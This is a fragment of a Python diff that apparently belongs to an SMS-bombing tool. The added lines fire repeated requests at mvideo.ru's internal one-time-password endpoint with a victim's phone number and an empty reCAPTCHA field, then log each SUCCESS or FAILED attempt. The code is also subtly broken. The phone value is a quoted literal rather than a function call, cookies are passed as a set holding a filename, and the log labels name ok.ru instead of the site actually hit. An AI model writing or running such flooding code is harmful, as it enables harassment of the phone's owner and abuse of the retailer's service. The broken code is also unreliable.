+			requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp?pageName=loginByUserPhoneVerification&fromCheckout=false&fromRegisterPage=true&snLogin=&bpg=&snProviderId=", headers = {'user-agent':'user_agent'}, data = {'phone':f'self.fancify2({number})', 'g-recaptcha-response':'', 'recaptcha':'on'}, cookies = {'mvideo_cookies.txt'})
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://ok.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://ok.ru'))
